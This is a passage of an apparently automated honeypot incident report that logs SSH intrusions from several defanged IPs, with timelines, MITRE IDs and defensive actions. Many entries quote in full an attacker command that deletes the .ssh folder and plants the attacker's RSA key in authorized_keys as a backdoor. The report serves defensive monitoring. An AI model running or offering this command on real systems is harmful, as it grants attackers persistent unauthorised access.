| **First Seen** | 2026-05-25 07:06 |
| **Last Seen** | 2026-05-25 07:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:06:48` | `cowrie.session.connect` |
| `2026-05-25 07:06:48` | `cowrie.client.version` |
| `2026-05-25 07:06:48` | `cowrie.client.kex` |
| `2026-05-25 07:06:49` | `cowrie.login.success` |
| `2026-05-25 07:06:50` | `cowrie.session.params` |
| `2026-05-25 07:06:50` | `cowrie.command.input` |
| `2026-05-25 07:06:50` | `cowrie.command.failed` |
| `2026-05-25 07:06:50` | `cowrie.log.closed` |
| `2026-05-25 07:06:51` | `cowrie.session.params` |
| `2026-05-25 07:06:51` | `cowrie.command.input` |
| `2026-05-25 07:06:51` | `cowrie.session.file_download` |
| `2026-05-25 07:06:51` | `cowrie.log.closed` |
| `2026-05-25 07:06:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-299e64cb5405

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-25 07:06 |
| **Last Seen** | 2026-05-25 07:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:06:54` | `cowrie.session.connect` |
| `2026-05-25 07:06:54` | `cowrie.client.version` |
| `2026-05-25 07:06:54` | `cowrie.client.kex` |
| `2026-05-25 07:06:55` | `cowrie.login.success` |
| `2026-05-25 07:06:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e70feb1e208

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-05-25 07:09 |
| **Last Seen** | 2026-05-25 07:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:09:08` | `cowrie.session.connect` |
| `2026-05-25 07:09:08` | `cowrie.client.version` |
| `2026-05-25 07:09:08` | `cowrie.client.kex` |
| `2026-05-25 07:09:08` | `cowrie.login.success` |
| `2026-05-25 07:09:08` | `cowrie.session.params` |
| `2026-05-25 07:09:08` | `cowrie.command.input` |
| `2026-05-25 07:09:08` | `cowrie.command.failed` |
| `2026-05-25 07:09:09` | `cowrie.log.closed` |
| `2026-05-25 07:09:09` | `cowrie.session.params` |
| `2026-05-25 07:09:09` | `cowrie.command.input` |
| `2026-05-25 07:09:09` | `cowrie.session.file_download` |
| `2026-05-25 07:09:09` | `cowrie.log.closed` |
| `2026-05-25 07:09:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e98f4bf3e73b

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-05-25 07:09 |
| **Last Seen** | 2026-05-25 07:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:09:11` | `cowrie.session.connect` |
| `2026-05-25 07:09:11` | `cowrie.client.version` |
| `2026-05-25 07:09:11` | `cowrie.client.kex` |
| `2026-05-25 07:09:11` | `cowrie.login.success` |
| `2026-05-25 07:09:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f310e3cc331b

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-05-25 07:13 |
| **Last Seen** | 2026-05-25 07:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:13:21` | `cowrie.session.connect` |
| `2026-05-25 07:13:21` | `cowrie.client.version` |
| `2026-05-25 07:13:22` | `cowrie.client.kex` |
| `2026-05-25 07:13:22` | `cowrie.login.success` |
| `2026-05-25 07:13:22` | `cowrie.session.params` |
| `2026-05-25 07:13:22` | `cowrie.command.input` |
| `2026-05-25 07:13:22` | `cowrie.command.failed` |
| `2026-05-25 07:13:22` | `cowrie.log.closed` |
| `2026-05-25 07:13:23` | `cowrie.session.params` |
| `2026-05-25 07:13:23` | `cowrie.command.input` |
| `2026-05-25 07:13:23` | `cowrie.session.file_download` |
| `2026-05-25 07:13:23` | `cowrie.log.closed` |
| `2026-05-25 07:13:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5827cbe4bd59

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-05-25 07:13 |
| **Last Seen** | 2026-05-25 07:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:13:24` | `cowrie.session.connect` |
| `2026-05-25 07:13:24` | `cowrie.client.version` |
| `2026-05-25 07:13:25` | `cowrie.client.kex` |
| `2026-05-25 07:13:25` | `cowrie.login.success` |
| `2026-05-25 07:13:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26d66f1e5732

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-25 07:14 |
| **Last Seen** | 2026-05-25 07:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:14:28` | `cowrie.session.connect` |
| `2026-05-25 07:14:28` | `cowrie.client.version` |
| `2026-05-25 07:14:29` | `cowrie.client.kex` |
| `2026-05-25 07:14:30` | `cowrie.login.success` |
| `2026-05-25 07:14:30` | `cowrie.session.params` |
| `2026-05-25 07:14:30` | `cowrie.command.input` |
| `2026-05-25 07:14:30` | `cowrie.command.failed` |
| `2026-05-25 07:14:31` | `cowrie.log.closed` |
| `2026-05-25 07:14:31` | `cowrie.session.params` |
| `2026-05-25 07:14:31` | `cowrie.command.input` |
| `2026-05-25 07:14:31` | `cowrie.session.file_download` |
| `2026-05-25 07:14:31` | `cowrie.log.closed` |
| `2026-05-25 07:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-232ff324352e

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-25 07:14 |
| **Last Seen** | 2026-05-25 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:14:34` | `cowrie.session.connect` |
| `2026-05-25 07:14:34` | `cowrie.client.version` |
| `2026-05-25 07:14:34` | `cowrie.client.kex` |
| `2026-05-25 07:14:35` | `cowrie.login.success` |
| `2026-05-25 07:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99b572192a8e

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-25 07:17 |
| **Last Seen** | 2026-05-25 07:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:17:55` | `cowrie.session.connect` |
| `2026-05-25 07:17:55` | `cowrie.client.version` |
| `2026-05-25 07:17:55` | `cowrie.client.kex` |
| `2026-05-25 07:17:56` | `cowrie.login.success` |
| `2026-05-25 07:17:57` | `cowrie.session.params` |
| `2026-05-25 07:17:57` | `cowrie.command.input` |
| `2026-05-25 07:17:57` | `cowrie.command.failed` |
| `2026-05-25 07:17:57` | `cowrie.log.closed` |
| `2026-05-25 07:17:57` | `cowrie.session.params` |
| `2026-05-25 07:17:57` | `cowrie.command.input` |
| `2026-05-25 07:17:58` | `cowrie.session.file_download` |
| `2026-05-25 07:17:58` | `cowrie.log.closed` |
| `2026-05-25 07:18:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a70e58277d69

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-25 07:18 |
| **Last Seen** | 2026-05-25 07:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:18:01` | `cowrie.session.connect` |
| `2026-05-25 07:18:01` | `cowrie.client.version` |
| `2026-05-25 07:18:01` | `cowrie.client.kex` |
| `2026-05-25 07:18:02` | `cowrie.login.success` |
| `2026-05-25 07:18:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a79545d3d7de

| Field | Detail |
|---|---|
| **Source IP** | `91.201.216[.]61` |
| **First Seen** | 2026-05-25 07:21 |
| **Last Seen** | 2026-05-25 07:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:21:16` | `cowrie.session.connect` |
| `2026-05-25 07:21:16` | `cowrie.client.version` |
| `2026-05-25 07:21:16` | `cowrie.client.kex` |
| `2026-05-25 07:21:17` | `cowrie.login.success` |
| `2026-05-25 07:21:17` | `cowrie.session.params` |
| `2026-05-25 07:21:17` | `cowrie.command.input` |
| `2026-05-25 07:21:17` | `cowrie.command.failed` |
| `2026-05-25 07:21:18` | `cowrie.log.closed` |
| `2026-05-25 07:21:18` | `cowrie.session.params` |
| `2026-05-25 07:21:18` | `cowrie.command.input` |
| `2026-05-25 07:21:18` | `cowrie.session.file_download` |
| `2026-05-25 07:21:18` | `cowrie.log.closed` |
| `2026-05-25 07:21:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.201.216[.]61` to AbuseIPDB if not already reported
- [ ] Block `91.201.216[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd2d8ba14ec3

| Field | Detail |
|---|---|
| **Source IP** | `91.201.216[.]61` |
| **First Seen** | 2026-05-25 07:21 |
| **Last Seen** | 2026-05-25 07:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:21:21` | `cowrie.session.connect` |
| `2026-05-25 07:21:21` | `cowrie.client.version` |
| `2026-05-25 07:21:21` | `cowrie.client.kex` |
| `2026-05-25 07:21:22` | `cowrie.login.success` |
| `2026-05-25 07:21:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.201.216[.]61` to AbuseIPDB if not already reported
- [ ] Block `91.201.216[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66fac187ea3c

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-25 07:21 |
| **Last Seen** | 2026-05-25 07:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:21:34` | `cowrie.session.connect` |
| `2026-05-25 07:21:34` | `cowrie.client.version` |
| `2026-05-25 07:21:35` | `cowrie.client.kex` |
| `2026-05-25 07:21:36` | `cowrie.login.success` |
| `2026-05-25 07:21:36` | `cowrie.session.params` |
| `2026-05-25 07:21:36` | `cowrie.command.input` |
| `2026-05-25 07:21:36` | `cowrie.command.failed` |
| `2026-05-25 07:21:37` | `cowrie.log.closed` |
| `2026-05-25 07:21:37` | `cowrie.session.params` |
| `2026-05-25 07:21:37` | `cowrie.command.input` |
| `2026-05-25 07:21:37` | `cowrie.session.file_download` |
| `2026-05-25 07:21:37` | `cowrie.log.closed` |
| `2026-05-25 07:21:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c352d05006f

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-25 07:21 |
| **Last Seen** | 2026-05-25 07:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:21:40` | `cowrie.session.connect` |
| `2026-05-25 07:21:40` | `cowrie.client.version` |
| `2026-05-25 07:21:40` | `cowrie.client.kex` |
| `2026-05-25 07:21:41` | `cowrie.login.success` |
| `2026-05-25 07:21:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b7b4023b99e

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-25 07:23 |
| **Last Seen** | 2026-05-25 07:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:23:23` | `cowrie.session.connect` |
| `2026-05-25 07:23:23` | `cowrie.client.version` |
| `2026-05-25 07:23:23` | `cowrie.client.kex` |
| `2026-05-25 07:23:24` | `cowrie.login.success` |
| `2026-05-25 07:23:25` | `cowrie.session.params` |
| `2026-05-25 07:23:25` | `cowrie.command.input` |
| `2026-05-25 07:23:25` | `cowrie.command.failed` |
| `2026-05-25 07:23:25` | `cowrie.log.closed` |
| `2026-05-25 07:23:25` | `cowrie.session.params` |
| `2026-05-25 07:23:25` | `cowrie.command.input` |
| `2026-05-25 07:23:26` | `cowrie.session.file_download` |
| `2026-05-25 07:23:26` | `cowrie.log.closed` |
| `2026-05-25 07:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38828b87913f

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-25 07:23 |
| **Last Seen** | 2026-05-25 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:23:29` | `cowrie.session.connect` |
| `2026-05-25 07:23:29` | `cowrie.client.version` |
| `2026-05-25 07:23:29` | `cowrie.client.kex` |
| `2026-05-25 07:23:30` | `cowrie.login.success` |
| `2026-05-25 07:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e97bae148ab

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-25 07:25 |
| **Last Seen** | 2026-05-25 07:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:25:36` | `cowrie.session.connect` |
| `2026-05-25 07:25:36` | `cowrie.client.version` |
| `2026-05-25 07:25:37` | `cowrie.client.kex` |
